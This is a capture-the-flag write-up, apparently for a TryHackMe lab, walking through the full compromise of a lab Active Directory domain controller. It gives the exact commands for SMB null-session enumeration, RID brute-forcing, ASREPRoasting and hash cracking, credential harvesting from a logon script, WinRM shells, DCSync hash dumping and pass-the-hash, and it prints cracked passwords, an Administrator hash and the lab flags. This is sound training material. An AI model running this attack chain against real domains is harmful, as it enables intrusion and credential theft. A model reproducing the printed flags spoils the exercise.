# VulnNet: Roasted — Writeup

## Objective
Full compromise of the `vulnnet-rst.local` domain controller
(10.64.157.1 / 10.66.162.195), from initial enumeration through Domain
Admin and flag retrieval.

## 1. Nmap Scan
```
nmap -sC -sV -p- 10.64.157.1
```
**Notable ports:** 53 (DNS), 88 (Kerberos), 389/3268 (LDAP), 445 (SMB),
5985 (WinRM — missed initially, important later).

Domain confirmed as `vulnnet-rst.local`, hostname `WIN-2BO8M1OE1M1`.
SMB signing enabled and required — rules out SMB relay attacks.

> Note: Port 5985 (WinRM) was open from the start but initially
> overlooked.
## 2. SMB Null Session Share Enumeration
```
smbclient -L //10.64.157.1 -N
```
Null session worked. Two non-default shares stood out immediately:
- `VulnNet-Business-Anonymous`
- `VulnNet-Enterprise-Anonymous`

Downloaded all files from both shares — text files with no immediately
useful credential content.

## 3. Initial User Enumeration — enum4linux
```
enum4linux -a 10.64.157.1
```
Returned only default/well-known accounts: `administrator`, `guest`,
`krbtgt`, `domain admins`, `root`, `bin`. No real domain user accounts
— a signal that RID brute-forcing was needed.

## 4. Kerbrute Username Validation
```
kerbrute userenum -d vulnnet-rst.local --dc 10.64.157.1 users.txt
```
Confirmed only two valid accounts: `guest` and `administrator` — both
default accounts, confirming the username list was incomplete.

## 5. ASREPRoasting — Default Accounts
```
GetNPUsers.py vulnnet-rst.local/administrator -dc-ip 10.64.157.1 -no-pass
GetNPUsers.py vulnnet-rst.local/guest -dc-ip 10.64.157.1 -no-pass
```
Neither account had Kerberos pre-authentication disabled. No hashes
returned.

## 6. RID Brute-Force — Full Domain User List
Added domain to `/etc/hosts` first to fix DNS resolution:
```
echo "10.64.157.1 vulnnet-rst.local" >> /etc/hosts
```
Then ran RID cycling to enumerate all actual domain accounts:
```
lookupsid.py vulnnet-rst.local/guest:@vulnnet-rst.local
```
Returned a full list of domain accounts beyond the defaults:
- `enterprise-core-vn`
- `a-whitehat`
- `t-skid`
- `j-goldenhand`
- `j-leet`

## 7. ASREPRoasting — Full User List
```
GetNPUsers.py vulnnet-rst.local/ -usersfile users.txt -dc-ip 10.64.157.1 -no-pass
```
`t-skid` had Kerberos pre-authentication disabled — AS-REP hash
returned.

## 8. Cracking the Hash
```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
Cracked: `t-skid:tj072889*`

## 9. Authenticated SMB Enumeration with t-skid
```
nxc smb 10.66.162.195 -u t-skid -p 'tj072889*' --shares
```
Credentials confirmed valid. `NETLOGON` now readable — browsed it:
```
smbclient //10.66.162.195/NETLOGON -U t-skid
```
Found `ResetPassword.vbs` — a logon script containing hardcoded
credentials:
```vb
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

## 10. Privilege Escalation — a-whitehat
Confirmed `a-whitehat` access level:
```
nxc smb 10.66.162.195 -u a-whitehat -p 'bNdKVkjv3RR9ht' --shares
```
Result: `(Pwn3d!)` — `a-whitehat` has local admin rights.
`ADMIN$` and `C$` both had READ/WRITE permissions.

## 11. WinRM Access — User Flag
Port 5985 (WinRM) was open — connected with `a-whitehat`:
```
evil-winrm -i 10.66.162.195 -u a-whitehat -p bNdKVkjv3RR9ht
```
Navigated to `enterprise-core-vn`'s Desktop and retrieved the user
flag:
```
type C:\Users\enterprise-core-vn\Desktop\user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
```

## 12. DCSync — Domain Hash Dump
`a-whitehat` had replication rights — ran secretsdump:
```
secretsdump.py vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.67.155.88
```
Dumped full domain credentials including:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
```

## 13. Pass-the-Hash — Administrator
```
evil-winrm -i 10.67.155.88 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
```
Full Administrator shell on the DC.

## 14. System Flag
```
type C:\Users\Administrator\Desktop\system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
```

## Flags
```
THM{726b7c0baaac1455d05c827b5561f4ed}   — user.txt (enterprise-core-vn Desktop)
THM{16f45e3934293a57645f8d7bf71d8d4c}   — system.txt (Administrator Desktop)
```

## Summary
Classic AD attack chain — null session SMB confirmed anonymous access
and two anonymous shares, which initially contained nothing useful.
enum4linux and Kerbrute only returned default accounts, which was the
signal to pivot to RID brute-forcing via `lookupsid.py` — this revealed
five real domain users. ASREPRoasting the full list cracked `t-skid`'s
hash, whose credentials were used to authenticate to NETLOGON and
discover a VBScript logon script containing hardcoded credentials for
`a-whitehat`. That account had local admin rights and WinRM access,
enabling a shell and eventually DCSync to dump all domain hashes.
Administrator's NTLM hash was used directly for Pass-the-Hash via
Evil-WinRM to retrieve the system flag.

## Key Lesson
enum4linux and Kerbrute returning only default accounts (`administrator`,
`guest`, `krbtgt`) is NOT a complete user list — it's a signal to RID
brute-force. Real domain accounts live in the 1100+ RID range and are
only surfaced by cycling SIDs, not wordlist-based tools.


